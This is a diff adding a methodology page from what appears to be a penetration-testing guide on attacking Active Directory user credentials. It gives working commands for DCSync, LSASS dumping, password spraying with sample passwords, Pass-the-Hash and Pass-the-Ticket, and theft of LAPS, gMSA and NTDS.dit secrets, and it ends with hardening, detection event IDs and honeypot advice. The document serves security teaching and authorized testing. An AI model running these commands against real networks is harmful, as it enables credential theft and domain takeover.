@@ -1,0 +1,344 @@
+---
+title: "Part 4: Exploiting AD Users"
+description: "Credential attacks against AD users — DCSync, LSASS dumping, password spraying, Pass-the-Hash, Pass-the-Ticket, LAPS, and credential harvesting."
+category: Methodology
+subcategory: Active Directory Attack
+order: 4
+tags: ["active-directory", "credentials", "dcsync", "pass-the-hash", "pentesting"]
+updated: 2026-04-11
+---
+
+# Part 4: Exploiting AD Users
+
+User objects are the lifeblood of Active Directory. Every compromised credential opens new attack paths — and AD stores credentials in ways that are surprisingly accessible to attackers. This section covers every major technique for extracting, abusing, and leveraging user credentials.
+
+---
+
+## DCSync
+
+**Severity:** 🔴 Critical
+
+DCSync abuses the Directory Replication Service (DRS) protocol to request password data from a Domain Controller — the same protocol DCs use to replicate with each other. If you have `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All` rights (granted to Domain Admins, Enterprise Admins, and DC machine accounts by default), you can pull every hash in the domain.
+
+### Who Has DCSync Rights?
+
+```powershell
+# Check replication rights
+Get-DomainObjectAcl "DC=domain,DC=local" -ResolveGUIDs | ? {
+  $_.ObjectAceType -match "Replicating" -and
+  $_.ActiveDirectoryRights -match "ExtendedRight"
+} | select SecurityIdentifier, ObjectAceType
+```
+
+### Exploitation
+
+```bash
+# Dump a single account (krbtgt = Golden Ticket material)
+secretsdump.py domain.local/admin:'password'@dc01.domain.local -just-dc-user krbtgt
+
+# Dump everything
+secretsdump.py domain.local/admin:'password'@dc01.domain.local -just-dc
+
+# With NTLM hash (Pass-the-Hash)
+secretsdump.py domain.local/admin@dc01.domain.local -hashes :NTHASH -just-dc
+```
+
+```powershell
+# Mimikatz
+mimikatz "lsadump::dcsync /domain:domain.local /user:krbtgt"
+mimikatz "lsadump::dcsync /domain:domain.local /all /csv"
+```
+
+### What You Get
+
+```
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+Administrator:500:aad3b435...:8846f7ea...:::
+krbtgt:502:aad3b435...:a577fcf1...:::
+svc_admin:1105:aad3b435...:2b576acb...:::
+```
+
+The `krbtgt` hash is the key to **Golden Tickets** (see Part 8).
+
+---
+
+## LSASS Credential Dumping
+
+**Severity:** 🔴 Critical
+
+The Local Security Authority Subsystem Service (LSASS) stores credentials for users currently (or recently) logged into a machine. Dumping it gives you NTLM hashes, Kerberos tickets, and sometimes cleartext passwords.
+
+### Direct Mimikatz
+
+```powershell
+# Dump all credentials from memory
+mimikatz "privilege::debug" "sekurlsa::logonpasswords"
+
+# Dump Kerberos tickets
+mimikatz "sekurlsa::tickets /export"
+
+# Dump cached domain credentials
+mimikatz "lsadump::cache"
+```
+
+### LSASS Process Dump (Stealthier)
+
+```powershell
+# Task Manager: right-click lsass.exe → Create dump file
+
+# Using comsvcs.dll (LOLBin — no tools needed)
+tasklist | findstr lsass
+rundll32.exe comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full
+
+# Using ProcDump (Sysinternals — signed by Microsoft)
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+```
+
+Then extract offline:
+
+```powershell
+# Parse the dump with mimikatz
+mimikatz "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
+
+# Or with pypykatz (Python)
+pypykatz lsa minidump lsass.dmp
+```
+
+### Remote Dumping
+
+```bash
+# CrackMapExec — dump SAM, LSA, or NTDS
+crackmapexec smb target -u admin -p pass --sam         # Local accounts
+crackmapexec smb target -u admin -p pass --lsa         # LSA secrets
+crackmapexec smb dc01 -u admin -p pass --ntds          # Full NTDS.dit
+
+# Impacket
+secretsdump.py domain.local/admin:pass@target
+```
+
+---
+
+## Password Spraying
+
+**Severity:** 🟠 High
+
+Try one or two common passwords against every domain user. Effective because large organizations always have users with weak passwords.
+
+### Check Lockout Policy First
+
+```powershell
+# CRITICAL: check before spraying
+Get-ADDefaultDomainPasswordPolicy
+# Look at: LockoutThreshold, LockoutObservationWindow, LockoutDuration
+
+# Fine-grained policies
+Get-ADFineGrainedPasswordPolicy -Filter *
+```
+
+### Spraying Tools
+
+```bash
+# CrackMapExec (respects lockout if you're careful)
+crackmapexec smb dc01 -u users.txt -p 'Spring2026!' --continue-on-success
+
+# Kerbrute (faster — uses Kerberos pre-auth, less likely to trigger lockout logging)
+kerbrute passwordspray -d domain.local --dc dc01 users.txt 'Company2026!'
+
+# Spray specific patterns
+# Season+Year: Spring2026!, Summer2026!, Winter2025!
+# Company+number: Contoso2026!, Contoso123!
+# Welcome variants: Welcome1!, Welcome2026!
+```
+
+### User List Generation
+
+```bash
+# Pull users from LDAP
+ldapsearch -x -H ldap://dc01 -D "user@domain.local" -w pass \
+  -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName
+
+# From CrackMapExec
+crackmapexec smb dc01 -u user -p pass --users | awk '{print $5}' > users.txt
+
+# RID brute-force (no creds needed sometimes)
+crackmapexec smb dc01 -u '' -p '' --rid-brute
+```
+
+---
+
+## Pass-the-Hash (PtH)
+
+**Severity:** 🟠 High
+
+Authenticate with an NTLM hash instead of a cleartext password. Works with most Windows protocols that accept NTLM.
+
+```bash
+# Impacket suite
+psexec.py domain.local/admin@target -hashes :NTHASH
+wmiexec.py domain.local/admin@target -hashes :NTHASH
+smbexec.py domain.local/admin@target -hashes :NTHASH
+atexec.py domain.local/admin@target -hashes :NTHASH "whoami"
+
+# CrackMapExec
+crackmapexec smb target -u admin -H NTHASH
+crackmapexec smb target -u admin -H NTHASH -x "whoami"
+crackmapexec winrm target -u admin -H NTHASH
+
+# Evil-WinRM
+evil-winrm -i target -u admin -H NTHASH
+```
+
+```powershell
+# Mimikatz — inject hash into current session
+mimikatz "sekurlsa::pth /user:admin /domain:domain.local /ntlm:NTHASH"
+```
+
+---
+
+## Pass-the-Ticket (PtT)
+
+**Severity:** 🟠 High
+
+Inject a Kerberos ticket (TGT or TGS) into your session.
+
+```powershell
+# Export tickets from current session
+Rubeus.exe dump /nowrap
+mimikatz "sekurlsa::tickets /export"
+
+# Import a ticket (Windows)
+Rubeus.exe ptt /ticket:<base64_ticket>
+mimikatz "kerberos::ptt ticket.kirbi"
+
+# Verify
+klist
+```
+
+```bash
+# Linux — set the ccache and use Kerberos tools
+export KRB5CCNAME=/path/to/ticket.ccache
+
+psexec.py -k -no-pass domain.local/admin@target
+smbclient.py -k -no-pass domain.local/admin@target
+```
+
+---
+
+## Overpass-the-Hash (Pass-the-Key)
+
+Convert an NTLM hash into a Kerberos TGT:
+
+```powershell
+# Mimikatz — request TGT using NTLM hash
+mimikatz "sekurlsa::pth /user:admin /domain:domain.local /ntlm:HASH /run:cmd.exe"
+
+# Rubeus — request TGT with AES/RC4 key
+Rubeus.exe asktgt /user:admin /domain:domain.local /rc4:HASH /ptt
+Rubeus.exe asktgt /user:admin /domain:domain.local /aes256:AESKEY /ptt
+```
+
+---
+
+## Credential Harvesting from User Attributes
+
+### Passwords in Description Field
+
+```powershell
+# Surprisingly common
+Get-DomainUser | ? {$_.description -match "pass|pwd|cred"} | select name, description
+```
+
+### LAPS Passwords
+
+```powershell
+# Read LAPS password (requires read permission on ms-Mcs-AdmPwd)
+Get-DomainComputer TARGET -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
+
+# CrackMapExec
+crackmapexec ldap dc01 -u user -p pass -M laps
+
+# Who can read LAPS passwords?
+Find-AdmPwdExtendedRights -Identity "OU=Servers,DC=domain,DC=local"
+```
+
+### gMSA Password Extraction
+
+```bash
+# If you can read msDS-ManagedPassword attribute
+gMSADumper.py -u user -p pass -d domain.local
+
+# CrackMapExec
+crackmapexec ldap dc01 -u user -p pass --gmsa
+```
+
+### NTDS.dit Offline Extraction
+
+If you have physical or Backup Operator access:
+
+```powershell
+# Create shadow copy
+vssadmin create shadow /for=C:
+
+# Copy NTDS.dit and SYSTEM hive
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\temp\
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
+```
+
+```bash
+# Extract hashes offline
+secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
+```
+
+---
+
+## Defense & Detection
+
+### Hardening
+
+| Control | What It Prevents |
+|---|---|
+| **Credential Guard** | LSASS dumping (protects with virtualization) |
+| **LAPS** | Shared/reused local admin passwords |
+| **Protected Users** group | NTLM auth, delegation, credential caching for members |
+| **gMSA** for service accounts | Weak service account passwords |
+| **Fine-grained password policies** | Weak passwords on privileged accounts |
+| **Disable NTLM** (enforce Kerberos) | Pass-the-Hash attacks |
+| **Tiered administration** | Credential exposure across tiers |
+
+### Detection (Event IDs)
+
+| Event ID | What It Catches |
+|---|---|
+| **4625** | Failed logon — spray detection (many failures, same password) |
+| **4771** | Kerberos pre-auth failure — Kerberos spray detection |
+| **4624 (Type 3, 9, 10)** | Network logon — PtH indicators |
+| **4662** | Directory service access — DCSync detection |
+| **4672** | Special privileges assigned — admin logon tracking |
+| **1102** | Audit log cleared — anti-forensics indicator |
+
+### Honeypot Credentials
+
+Place fake credentials where attackers look:
+
+```powershell
+# Password in description (monitored)
+Set-ADUser -Identity honeypot_admin -Description "Temp password: H0n3yP0t2026!"
+
+# Service account with SPN (Kerberoast canary)
+New-ADUser -Name "svc_backup_legacy" -ServicePrincipalNames "http/legacy.domain.local"
+# Monitor Event ID 4769 for this SPN
+```
+
+&nbsp;
+
+&nbsp;
+
+---
+
+> **Next up → [Part 5: Exploiting GPOs](/docs/methodology/active-directory-attack/05-gpos)** — Group Policy modification abuse, GPP password extraction, and GPO-based persistence.
+
+&nbsp;
+
+## Related Writeups
+
+*Writeups that put these techniques into practice will be linked here.*
